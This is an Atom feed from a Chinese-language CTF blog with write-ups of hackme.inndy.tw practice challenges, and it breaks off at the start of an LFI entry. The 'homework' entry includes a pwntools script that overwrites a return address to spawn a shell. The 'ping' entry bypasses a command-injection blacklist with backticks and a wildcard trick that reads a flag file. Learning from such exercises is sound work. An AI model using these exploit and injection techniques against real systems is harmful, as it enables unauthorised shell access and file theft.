<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BitSec&#39;s Blog</title>
  
  <subtitle>天道酬勤，厚德载物</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-10T08:51:28.549Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BitSec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>homework</title>
    <link href="http://yoursite.com/2019/10/10/homework/"/>
    <id>http://yoursite.com/2019/10/10/homework/</id>
    <published>2019-10-10T05:15:42.000Z</published>
    <updated>2019-10-10T08:51:28.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-homework"><a href="#src-hackme-homework" class="headerlink" title="[src = hackme] homework"></a>[src = hackme] homework</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7701</span><br></pre></td></tr></table></figure><p>Source Code, Index out bound, Return Address</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示查看源代码，并且注意索引越界（Index out bound），返回地址。<br>查看源代码，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">10</span>], i, v, act;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ......省略</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;act);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(act) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Index to edit: "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"How many? "</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v);</span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">         ......省略</span><br></pre></td></tr></table></figure><p>发现run_program()中定义了一个数组arr[10], 下面可以通过输入设置其值。但是在case1中赋值时没有检查index的值，导致可以输入任意的索引值，即导致任意地址读写。</p><p>而且在题目的源码中还给出了一个打开shell的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_me_maybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只要通过选择合适的Index的值，使得arr[Index]的位置巧合是run_program()函数的返回地址，并且将其值设置为call_me_maybe()的地址，则在run_program()返回时，将调用call_me_maybe()打开shell。<br>然后按照PWN的基本思路，在shell中通过cat flag获取flag即可。</p><p>这需要解决两个问题：</p><ol><li>call_me_maybe()的地址；</li><li>run_program()函数返回时返回地址与数组arr[10]的index的关系。</li></ol><p>第一个问题很容易解决，直接IDA打开homework的二进制程序，就可以看到，如图：<br><img src="./homework1.PNG" alt="homework"><br>可以看到call_me_maybe()的地址为0x080485FB。</p><p>第二个问题：获取run_program()函数返回时返回地址与数组arr[10]的index的关系可以通过运行可执行文件，并使用gdb进行调试得到。为了提高调试效率，建议安装gdb的插件pwndbg，具体安装方法可以查阅相关资料，不再赘述。</p><p>首先根据IDA找到case1，在jmp指令（0x080487AF）的位置下断点，来确定index与返回地址位置的关系：</p><p><img src="./homework2.PNG" alt="homework"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ gdb -q ./homework</span><br><span class="line">pwndbg: loaded 173 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./homework...done.</span><br><span class="line">pwndbg&gt; b *0x080487AF</span><br><span class="line">Breakpoint 1 at 0x80487af: file pwn-easy.c, line 59.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/bitsec/hackme/homework/homework </span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 1</span></span><br><span class="line"><span class="string">How many? 1</span></span><br></pre></td></tr></table></figure><p>此时栈状态如图：</p><p><img src="./homework3.PNG" alt="homework"></p><p>可以看出arr[0]的相对地址为0014，返回地址（标识ebp下面的地址）为004c，差为0x38/4=0xe=14.即arr[14]的位置为返回地址的位置，所以只要将arr[14]赋值为0x080485FB（call_me_maybe()的入口地址，对应的10进制为134514171）就可以打开shell。</p><p>其实熟悉栈帧排布的话，直接从IDA–&gt;F5，得到的run_program的源码也能分析出来。如图：</p><p><img src="./homework4.PNG" alt="homework"></p><p>可以看到arr在举例ebp为34h的位置，而ebp下紧挨着就是放回地址，即在ebp+4的位置。所以差为34h+4h=38h，得到同样的结果。</p><p>不要忘记，填充完毕之后，还要输入一个0，执行exit，才能从run_program返回，得到shell。</p><p>具体过程如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ nc hackme.inndy.tw 7701</span><br><span class="line">What<span class="string">'s your name? bitsec</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 1</span></span><br><span class="line"><span class="string">Index to edit: 14</span></span><br><span class="line"><span class="string">How many? 134514171</span></span><br><span class="line"><span class="string">0 &gt; exit</span></span><br><span class="line"><span class="string">1 &gt; edit number</span></span><br><span class="line"><span class="string">2 &gt; show number</span></span><br><span class="line"><span class="string">3 &gt; sum</span></span><br><span class="line"><span class="string">4 &gt; dump all numbers</span></span><br><span class="line"><span class="string"> &gt; 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">FLAG&#123;Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ&#125;</span></span><br></pre></td></tr></table></figure><p>其实很多情况下通过使用python的pwntool包写pwn的exp程序更有效，上面的过程可以通过下面的代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./homework")    #local debug</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"hackme.inndy.tw"</span>, <span class="number">7701</span>)  <span class="comment">#remote debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Input Name</span></span><br><span class="line">io.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">io.sendline(<span class="string">"Any String"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite return address</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"edit: "</span>)</span><br><span class="line">io.sendline(<span class="string">"14"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many? "</span>)</span><br><span class="line">system_addr = <span class="number">0x080485FB</span></span><br><span class="line">io.sendline(str(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">io.recvuntil(<span class="string">"dump all numbers"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/homework$ python homework_exp.py </span><br><span class="line">[+] Opening connection to hackme.inndy.tw on port 7701: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">homework</span><br><span class="line">run.sh</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;Yoooo, Index Over Flow <span class="keyword">in</span> my home work......OeAbaFeGeLaF9dEQ&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-homework&quot;&gt;&lt;a href=&quot;#src-hackme-homework&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] homework&quot;&gt;&lt;/a&gt;[src = hackme] homework&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7701&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Source Code, Index out bound, Return Address&lt;/p&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
    
    
      <category term="nc" scheme="http://yoursite.com/tags/nc/"/>
    
      <category term="cat" scheme="http://yoursite.com/tags/cat/"/>
    
      <category term="stack overflow" scheme="http://yoursite.com/tags/stack-overflow/"/>
    
  </entry>
  
  <entry>
    <title>catflag</title>
    <link href="http://yoursite.com/2019/10/10/catflag/"/>
    <id>http://yoursite.com/2019/10/10/catflag/</id>
    <published>2019-10-10T02:40:14.000Z</published>
    <updated>2019-10-10T02:46:35.126Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-catflag"><a href="#src-hackme-catflag" class="headerlink" title="[src = hackme] catflag"></a>[src = hackme] catflag</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7709</span><br></pre></td></tr></table></figure><p>Try using nc connect to server!</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目已经说得很清楚，直接nc链接然后cat flag即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~$ nc hackme.inndy.tw 7709</span><br><span class="line">plz capture the flag after 5 seconds...</span><br><span class="line">plz capture the flag after 4 seconds...</span><br><span class="line">plz capture the flag after 3 seconds...</span><br><span class="line">plz capture the flag after 2 seconds...</span><br><span class="line">plz capture the flag after 1 seconds...</span><br><span class="line">cat flag</span><br><span class="line">FLAG&#123;cat flag? dog flag!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-catflag&quot;&gt;&lt;a href=&quot;#src-hackme-catflag&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] catflag&quot;&gt;&lt;/a&gt;[src = hackme] catflag&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7709&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Try using nc connect to server!&lt;/p&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
    
    
      <category term="nc" scheme="http://yoursite.com/tags/nc/"/>
    
      <category term="cat" scheme="http://yoursite.com/tags/cat/"/>
    
  </entry>
  
  <entry>
    <title>scoreboard</title>
    <link href="http://yoursite.com/2019/10/10/scoreboard/"/>
    <id>http://yoursite.com/2019/10/10/scoreboard/</id>
    <published>2019-10-10T01:25:41.000Z</published>
    <updated>2019-10-10T01:30:10.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-scoreboard"><a href="#src-hackme-scoreboard" class="headerlink" title="[src = hackme] scoreboard"></a>[src = hackme] scoreboard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>提示不用抓包，前面已经看过网页源代码和其中的js文件，在本页面还有flag的话考虑是否在HTTP的header里面，因此直接火狐浏览器–&gt;F12. 刷新<a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">https://hackme.inndy.tw/scoreboard/</a>页面，在响应头发现flag：</p><p><img src="./scoreboard.PNG" alt="scoreboard"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对HTTP协议的理解，掌握查看HTTP请求头和响应头的方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-scoreboard&quot;&gt;&lt;a href=&quot;#src-hackme-scoreboard&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] scoreboard&quot;&gt;&lt;/a&gt;[src = hackme] scoreboard&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;DO NOT ATTACK or SCAN scoreboard, you don’t need to do that.&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>helloworld</title>
    <link href="http://yoursite.com/2019/10/10/helloworld/"/>
    <id>http://yoursite.com/2019/10/10/helloworld/</id>
    <published>2019-10-10T00:12:41.000Z</published>
    <updated>2019-10-10T01:38:37.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-helloworld"><a href="#src-hackme-helloworld" class="headerlink" title="[src = hackme] helloworld"></a>[src = hackme] helloworld</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Guess a number please :D</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>二进制程序，首先用IDA打开，查看流程，发现这是32位ELF文件。本题为入门题，可以直接使用IDA的F5功能，查看程序流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">29</span>]; <span class="comment">// [esp+Bh] [ebp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)flag = <span class="number">0xC881E8F1</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">4</span>] = <span class="number">0xCECF81D2</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">8</span>] = <span class="number">0x81C081D5</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">12</span>] = <span class="number">0xC8D5C0D3</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">16</span>] = <span class="number">0xCDC0CFCE</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">20</span>] = <span class="number">0xCCD4CF81</span>;</span><br><span class="line">  *(_DWORD *)&amp;flag[<span class="number">24</span>] = <span class="number">0x8FD3C4C3</span>;</span><br><span class="line">  flag[<span class="number">28</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is magic number? "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( n == <span class="number">0x12B9B0A1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; flag[i]; ++i )</span><br><span class="line">      flag[i] ^= n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag is FLAG&#123;%s&#125;\n"</span>, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try Hard."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序首先要求输入一个数n，然后跟数值0x12B9B0A1比较，如果相等，则对flag数组的每一个元素（字节）与n进行XOR运算，就可以得到flag（需要注意的是因为flag数组的每个元素为一个字节，所以虽然与n进行XOR，实际起作用的只有n的低位字节，即0xA1）。<br>所以只需要写一个脚本完成这个过程即可。</p><p>我们使用Python完成该部分脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xC881E8F1</span>,  <span class="comment">#可以看出是flag经过XOR异或加密得到的密文</span></span><br><span class="line"><span class="number">0xCECF81D2</span>,</span><br><span class="line"><span class="number">0x81C081D5</span>,</span><br><span class="line"><span class="number">0xC8D5C0D3</span>,</span><br><span class="line"><span class="number">0xCDC0CFCE</span>,</span><br><span class="line"><span class="number">0xCCD4CF81</span>,</span><br><span class="line"><span class="number">0x8FD3C4C3</span>]</span><br><span class="line"></span><br><span class="line">t = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    t += pack(<span class="string">"&lt;I"</span>,i).decode(<span class="string">'ISO-8859-1'</span>)  <span class="comment">#strcut的pack可以很好的处理C语言等的结构体，这里将其分解成字节，并连接成一个字符串。</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(t)):</span><br><span class="line">    flag += chr(ord(t[i])^<span class="number">0xa1</span>) <span class="comment">#对t字符串的每个字符（即字节）进行异或运算得到初始的flag</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>注意：<br>本例为python3程序，如果使用python2，decode(‘ISO-8859-1’)就不需要。关于pyhton2与python3的bytes和str的转换可以查阅相关资料，另外各种基本的的编码也应该熟悉，比如ASCII，GB2312，Unicode，UTF-8，ISO-8859-1等。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考察基本的逆向工程理解代码的能力，所以直接使用IDA既可以看到反编译的源码（F5），不过对于初学者还是建议分析一下具体的汇编代码，有助于理解汇编语言。</p><p>python写脚本的能力也是非常重要的！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-helloworld&quot;&gt;&lt;a href=&quot;#src-hackme-helloworld&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] helloworld&quot;&gt;&lt;/a&gt;[src = hackme] helloworld&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Guess a number please :D&lt;/p&gt;
    
    </summary>
    
    
      <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="逆向工程" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
    
      <category term="Binary" scheme="http://yoursite.com/tags/Binary/"/>
    
  </entry>
  
  <entry>
    <title>ping</title>
    <link href="http://yoursite.com/2019/10/09/ping/"/>
    <id>http://yoursite.com/2019/10/09/ping/</id>
    <published>2019-10-09T08:48:34.000Z</published>
    <updated>2019-10-09T09:17:53.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-ping"><a href="#src-hackme-ping" class="headerlink" title="[src = hackme] ping"></a>[src = hackme] ping</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you ping 127.0.0.1?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页如下：</p><p><img src="./ping.PNG" alt="ping"></p><p>可以看到页面进行了黑名单过滤，常用的|管道符，cat，cp等命令都被过滤掉了，所以无法进行简单的命令执行，如输入“|ls”会显示：“| not allowed”；哪如何绕过黑名单哪？</p><p>这时如果对Linux基本命令熟悉的话会想到反引号<code>；反引号主要用来引用一些函数、命令输出等，执行时系统会尝试将反引号中的内容当作一个命令执行。要想得到flag，我们需要先看一下当前目录下有没有flag相关文件，可以用ls命令（本题并没有过滤ls），所以输入</code>ls`，页面输出：<br><img src="./ping1.PNG" alt="ping1"></p><p>可以看到目录下有flag.php，index.php两个文件，flag.php里面应该包含了flag。常见的思路是使用cat命令查看该文件的内容，但是黑名单过滤了cat命令。那就需要考虑linux系统还有哪些可以查看文件内容，但又没有在黑名单的命令可用。其中sort就是其中一个。sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。<br>但是sort命令后面需要跟文件名，但flag被过滤，所以<code>sort flag.php</code>行不通。</p><p>哪这么办哪？可以想到Linux系统的通配符。输入<code>sort ????????</code>，可以得到flag。<br><img src="./ping2.PNG" alt="ping2"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考察了命令执行（Commnd Execution）漏洞的利用，主要考察了命令执行的基本原理，如何绕过过滤。其中一些常用的Linux系统命令的使用要熟悉，比如ls，cat，sort等。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-ping&quot;&gt;&lt;a href=&quot;#src-hackme-ping&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] ping&quot;&gt;&lt;/a&gt;[src = hackme] ping&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Can you ping 127.0.0.1?&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="Commnd Execution" scheme="http://yoursite.com/tags/Commnd-Execution/"/>
    
  </entry>
  
  <entry>
    <title>LFI</title>
    <link href="http://yoursite.com/2019/09/30/LFI/"/>
    <id>http://yoursite.com/2019/09/30/LFI/</id>
    <published>2019-09-30T08:08:52.000Z</published>
    <updated>2019-09-30T08:21:55.729Z</updated>
    
